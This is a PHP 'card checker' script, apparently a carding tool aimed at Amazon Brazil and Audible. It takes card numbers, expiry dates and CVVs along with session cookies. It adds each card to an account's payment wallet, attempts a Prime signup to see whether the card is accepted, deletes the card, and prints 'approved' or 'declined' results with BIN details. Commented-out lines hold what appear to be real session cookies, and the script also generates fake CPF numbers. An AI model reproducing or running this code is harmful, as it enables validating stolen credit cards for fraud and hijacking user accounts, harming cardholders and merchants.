<?php
error_reporting(0);
session_start();



function trazer($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$loadtime = time();
function getStr($separa, $inicia, $fim, $contador)
{
    $nada = explode($inicia, $separa);
    $nada = explode($fim, $nada[$contador]);
    return $nada[0];
}

$time = time();



function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}



function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
  
    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time(); // timestamp atual em segundos
    $random_num = mt_rand(1, 10000); // número aleatório entre 1 e 10000
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

// $email = generate_email();
// $cpf = gerarCPF();


$cards = $_GET['cards'];
$cc = multiexplode($cards)[0];
$mes = multiexplode($cards)[1];
$ano = multiexplode($cards)[2];
$cvv = multiexplode($cards)[3];

$parte1 = substr($cc, 0, 4);
$parte2 = substr($cc, 4, 4);
$parte3 = substr($cc, 8, 4);
$parte4 = substr($cc, 12, 4);
$mes = intval($mes);

function bin($cc)
{

    $contents = file_get_contents("bins.csv");
    $pattern = preg_quote(substr($cc, 0, 6) , '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches))
    {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(",", $encontrada);
    return "$pieces[4] $pieces[5] $pieces[1] $pieces[2] $pieces[3]";
}
$bin = bin($cards);

$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];


//$cslive = trim('session-id=146-2013868-9222542; ubid-acbbr=130-2434317-8652100; x-acbbr="rLxWBPdjGh?WhZosJ?mW0DIni3XRjXeNQN?Vy1dlLBKRLRED6uljrhYOYg2wS?Ps"; at-acbbr=Atza|IwEBIOLns4D9qV0261jba8hF0iHal-s0WMHdr2z3WydS1HqulBxJqaCq5zSI4vHi6QspA-hL8k8gt1RZH4cjumdeDFipty86sMmFsxnGPdf0KxwPwJpPbNams2r37X_TmbEn2-81o9LBPROs4hhldtjTxh-qv0nH5ciAGWMWKoC0m_jrMoj_4y4fBrnK6yi0yYrW0f7NqI3QmdQBpoOnpkqApElvaqUstLqFj-zd7FjLXdeBwg; sess-at-acbbr="2BugZgX+du1ZzbCGkC0st+3Cc2+DxoKkswPc492kqSw="; sst-acbbr=Sst1|PQFYRYowg81F8DXD1OdAVYQQCZj2TRC20_AddressHB9w9QHxygSf-O1hpBAmAC4v_KwxLW-Sh-CYs3fs4XvqFIPe6RBbdjcw_RtQ7e9tm5IiSXPvg74hA2-sDXl24QrKLTRC20_AddressR1TRC20_Addressw8XA1AtTRC20_AddressFj_RvgV2463Qw9dTOLwxaHUNPt_1kArmijPyD29Xk; lc-acbbr=pt_BR; session-id-time=2082787201l; i18n-prefs=BRL; csm-hit=tb:1MAP317KX9TD2BEDCH0T+s-JGMW07YQ0VNW40GTMMJA|1691543776810&t:1691543776810&adb:adblk_no; session-token="pIdStzEHTEMnqKjv/ZExC+qvlLe3WpUOyf8+p5a43p5nrKJZLwvgU4UNduu3euBzaSm46CoTg/GRU9xmsvERp6WOlrUxrIqCx98vut152+eFWbC9kTRC20_AddressRBWSBOjyNStoW4BjoEX01GJPu0YvynL1k+TDOHH7H3+VdgbyLWNIZuNH/7foNuENeVBFgjnI7Ft6c0gtfZLDInejy2voMKeT8uYtUd+VxOvVG0w0+5yg8ZJg="');

//$pklive = trim('originalSourceCode="WAPOR003052418003Q_08/02/2023 01:55";isFirstVisitAdbl=false;_gcl_au=1.1.548020034.1690941323;_scid=9333070a-5da1-4741-a92d-b8d100ae96ae;_fbp=fb.1.1690941323686.354896391;userType=amzn;adobeujs-optin=%7B%22aam%22%3Atrue%2C%22adcloud%22%3Atrue%2C%22aa%22%3Atrue%2C%22campaign%22%3Atrue%2C%22ecid%22%3Atrue%2C%22livefyre%22%3Atrue%2C%22target%22%3Atrue%2C%22mediaaa%22%3Atrue%7D;fltk=segID%3D16476262;aam_uuid=90667955054619066921854229506472977042;currentSourceCode="WAPOR003052418003Q_08/04/2023 10:55";s_inv=177316;ubid-main=133-9638064-3811209;session-id=144-9262840-8317424;session-token=spaDitFM1gVQd3kNmYTRC20_AddressMUBXQMQ0PDTDVN4TB7wsvv84UKs1/v3KvnIte/ECA+eYKBfZ3x9+0BtTgaRMJhjPbkl0z3m15k3ayT5MLME4SFlXx8pVFYdQgpe/croamogJEswrdkDz54714IbWh0rU354jIQ82rDfv+PrIjWaYBO5bKcRiCBlkuA4snnfxJXSDtbzIskENBiYRFlNzcdEwkFvOJH6y47Uc;x-main="vHv@Myu83t1laAHC5mJ@LtCvjTRC20_AddressIfjxz";at-main=Atza|IwEBICPc8Qm9sZcYLri-8M1K0XzviXWs0Pify35U3umF-r5NuMYUiVD5H4N14TRC20_AddressWJGLLu7R2SE8OiZ7UVMOwKOvBy72uBb0LM4V7pbwi-p8QtcEeMctPFvJJB6c3mm9n4mbZb6E3lcXku9P-lKzXDJ-KdzaolhpK0usz2K0cfrILj3ZginD0uejTdfDQK5T67T4Lup5BDlsVH7hM7w;sess-at-main="EBR4y6VKRpWiU5Jwd9HxiqHtdvHnf8jdCXWNJ3qHd+Q=";session-id-time=2082787201l;AMCVS_165958B4533AEE5B0A490D45%40AdobeOrg=1;AMCV_165958B4533AEE5B0A490D45%40AdobeOrg=359503849%7CMCIDTS%7C19576%7CMCMID%7C90688848701809941091851849356495917995%7CMCAAMLH-1691954203%7C4%7CMCAAMB-1691954203%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1691356603s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.0.1%7CMCCIDH%7C-734653148;at_check=true;s_ips=1947;s_cc=true;s_gpv=Reg%20HP;QSI_HistorySession=https%3A%2F%2Fwww.audible.com%2Fsubscription%2Fconfirmation%3FmembershipAsin%3DB076FLV3HT%26ref%3Da_hp_c2_member_cta1%26pf_rd_p%3Db75cf74d-08df-45ac-b2e9-73ec43978058%26pf_rd_r%3DHF8VND4DS114QD3JEW37%26pageLoadId%3DwdGDPPXreaTxj3i7%26creativeId%3D715bbde8-2268-497e-9fa7-ac23413109d3~1691349410299%7Chttps%3A%2F%2Fwww.audible.com%2F%3Fref%3Da_hp_t1_nav_header_logo%26pf_rd_p%3D7f82e587-451c-4841-90f0-4981f42c7c2c%26pf_rd_r%3DNGFTADN6J5D5D4NVA2HQ%26pageLoadId%3DQrqtfiWCcQE3FqH4%26creativeId%3De01f5746-aece-4e9f-a642-2f2b92763db9~1691350011015;_scid_r=9333070a-5da1-4741-a92d-b8d100ae96ae;mbox=PC#6d85f5ea4f854a8b90237829549bfb39.34_0#1754594834|session#4d73e5866fbd4140b88e7fed9a3610b3#1691351894;s_plt=6.39;s_pltp=Reg%20HP;csm-hit=tb:06CQ9EZQFVMAXQFNAGCB+s-JBZ5R76REZR26NZDRZPD|1691350088478&t:1691350088479&adb:adblk_no;s_nr30=1691350091536-Repeat;s_tslv=1691350091542;s_tp=3848;s_ppv=Reg%2520HP%2C51%2C51%2C1947%2C1%2C1');



$url = "https://www.amazon.com.br/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: www.amazon.com.br",
    "Cookie: $cslive",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
$customerId = trazer($resp, '"customerID":"', '"');
$session_id = trazer($resp, '"sessionId":"', '"');
$token_delete = trazer($resp, '"serializedState":"', '"');


function delete()
{
    global $customerId, $cslive;
    $url = "https://www.amazon.com.br/cpe/yourpayments/wallet";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Host: www.amazon.com.br",
        "Cookie: $cslive",
        "content-type: application/x-www-form-urlencoded",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "fallbackToMPOWidget=true";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    $tk_if = trazer($resp, 'name="ppw-widgetState" value="', '"');
    $card_if = trazer($resp, '&quot;iid&quot;:&quot;', '&');

    $url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Host: www.amazon.com.br",
        "Cookie: $cslive",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "viewport-width: 1536",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "accept: application/json, text/javascript, */*; q=0.01",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22$card_if%22%2C%22renderPopover%22%3A%22true%22%7D=&ppw-jsEnabled=true&ppw-widgetState=$tk_if&ie=UTF-8";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    $tk2_if = trazer($resp, 'name=\"ppw-widgetState\" value=\"', '\"');

    $url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Host: www.amazon.com.br",
        "Cookie: $cslive",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "viewport-width: 1536",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "accept: application/json, text/javascript, */*; q=0.01",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "ppw-widgetEvent%3ADeleteInstrumentEvent=&ppw-jsEnabled=true&ppw-widgetState=$tk2_if&ie=UTF-8";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
}

if (strpos($resp, 'Cartão de crédito terminando em')) {
    delete();
} elseif (strpos($resp, 'Cartão de débito terminando em')) {
    delete();
}

# GERAR TOKEN
$url = "https://www.audible.com/";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    
    "Cookie: $cookie_music",

);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

   $add_card = curl_exec($curl);
 $urlwark = trazer($add_card, '<a class="bc-button-text"  href="', '"');

 $enco = urlencode($urlencode);
$url = "https://www.audible.com/$urlwark";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    
    "Cookie: $pklive",

);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

 $add_card = curl_exec($curl);
 $tok = trazer($add_card, 'name="csrfToken" value="', '"');
 $tokenwark = urlencode($tok);


$url = "https://www.audible.com/unified-payment/update-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com$enco&relativeUrl=%2Fsubscription%2Fconfirmation&";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(

    "Cookie: $pklive",
 
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_paymentswidget_payments_list_choose_text&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_paymentswidget_payments_list_description&paymentsListTitleKey=adbl_paymentswidget_payments_list_title&selectedPaymentDescriptionKey=adbl_paymentswidget_selected_payment_description&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=false&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=true&showConfirmButton=false&showAddButton=false&showDeleteButtons=false&showEditButtons=true&showClosePaymentsListButton=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=true&ref=a_sbscrptnConfrmtn_c9_edit&paymentType=CreditCard&addCreditCardNumber=$parte1%20$parte2%20$parte3%20$parte4&expirationMonth=$mes&expirationYear=$ano&fullName=vaa%20asa&csrfToken=$tokenwark&country=US&addressLine1=new%20york&addressLine2=&zipCode=10080&state=NY&city=NEW%20YORK&useAsDefault=true&addressId=&accountHolderName=vaa%20asa";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

   $add_card = curl_exec($curl);
  $card_id = trazer($gerar_cardID, '"paymentId": "', '"');



$url = "https://www.amazon.com.br/gp/prime/pipeline/membersignup";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cslive",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

 $post_verify = curl_exec($curl);
$token_verify = trazer($post_verify, 'name="ppw-widgetState" value="','"');
$offerToken = trazer($post_verify, 'name="offerToken" value="','"');



$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cslive",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify2 = curl_exec($curl);
$card_id2 = trazer($post_verify2, '"preferencePaymentMethodIds":"[\"','\"');




$url = "https://www.amazon.com.br/hp/wlp/pipeline/actions";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cslive",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
   "accept: */*",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "offerToken=$offerToken&session-id=$session_id&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&wlpLocation=debugClientId_PrimeDefault&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&isHorizonteFlow=1&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&wait=1&inline=1&disableCSM=1";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$Fim = curl_exec($curl);
// if (strpos($Fim, 'acceptOffer')) {
//     sendMessage("<b>✅Alguem tirou live UP\nLIVE: $parte1-XXXX-XXXX-$parte4\n[$info_bin]\nGate Amazon BR🔥</b>");
// }


# Delete passo 1

$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cslive",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-jsEnabled=true&ppw-widgetState=$token_delete&ppw-widgetEvent=StartEditEvent&ppw-iid=$card_id2&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$parte1 = curl_exec($curl);
$ps1 = trazer($parte1, 'name=\"ppw-widgetState\" value=\"','\"');


$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cslive",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22$card_id%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Remover+da+carteira&ppw-jsEnabled=true&ppw-widgetState=$ps1&ie=UTF-8&ppw-accountHolderName=Samuel+Silva&ppw-expirationDate_month=$mes&ppw-expirationDate_year=20$ano";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$parte2 = curl_exec($curl);
$ps2 = trazer($parte2, 'name=\"ppw-widgetState\" value=\"','\"');


$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cslive",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-jsEnabled=true&ppw-widgetState=$ps2&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$parte3 = curl_exec($curl);
if (!strpos($parte3, 'Sua forma de pagamento foi removida com sucesso.')) {
    delete();
}


//---------------------------//CONSULTA BIN//------------------------//
include("consultarbin.php");
$bin = "$bandeira $banco $level $paiscode $pais";
//---------------------------///////////////------------------------//



if (strpos($Fim, 'acceptOffer')) {
    echo "<font size='3'><span class='badge badge-soft-success'>Aprovada✔</span> ➔ $cc|$mes|$ano|$cvv ➔ $bin ➔ retorno: <span class='badge badge-soft-success'>[ Cartão Aprovado ] </span><b>Tempo de Resposta: (".(time() - $time)." SEG) ➔ <b><span class='text-success'><span class='text-warning'>@Poucas</span></b></font><br>";
  
    curl_close($curl);
    exit();
 } elseif (strpos($Fim, 'InvalidInput')) {
    echo "<font size='3'><span class='badge badge-soft-danger'>Reprovada</span> ➔ $cc|$mes|$ano|$cvv ➔ $bin ➔ Retorno: <span class='badge badge-soft-danger'>[ CARTÃO INVALIDO OU COOKIES CAIU ] </span><b>Tempo de Resposta: (".(time() - $time)." SEG) ➔ <b><span class='text-success'><span class='text-warning'>@Poucas</span><br></b></font><br>";
    curl_close($curl);
    exit();
 } elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
    echo "<font size='3'><span class='badge badge-soft-danger'>Reprovada</span> ➔ $cc|$mes|$ano|$cvv ➔ $bin ➔ Retorno: <span class='badge badge-soft-danger'>[ Cartão Recusado]</span><b>Tempo de Resposta: (".(time() - $time)." SEG) ➔ <b><span class='text-success'><span class='text-warning'>@Poucas</span></b></font><br>";
    curl_close($curl);
    exit();
 } else {
    echo "<font size='3'><span class='badge badge-soft-danger'>Reprovada</span> ➔ $cc|$mes|$ano|$cvv ➔ $bin ➔ Retorno: <span class='badge badge-soft-danger'>[ ERRO INESPERADO ] </span><b>Tempo de Resposta: (".(time() - $time)." SEG) ➔ <b><span class='text-success'><span class='text-warning'>@Poucas</span><br></b></font><br>";
    curl_close($curl);
    exit();
 }



